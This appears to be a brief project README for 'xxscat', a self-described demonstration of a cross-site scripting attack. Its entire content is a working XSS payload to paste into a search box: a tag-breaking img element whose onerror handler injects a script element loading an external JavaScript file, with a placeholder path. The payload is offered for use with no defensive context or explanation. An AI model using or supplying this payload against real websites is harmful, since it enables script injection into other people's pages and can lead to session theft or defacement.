# xxscat
> a simple script to demonstrate an xss attack

### how to use:
paste this to search box
```
"><img src=x onerror="var s=document.createElement('script');s.src='pathtojs/cat.js';document.body.appendChild(s)">
```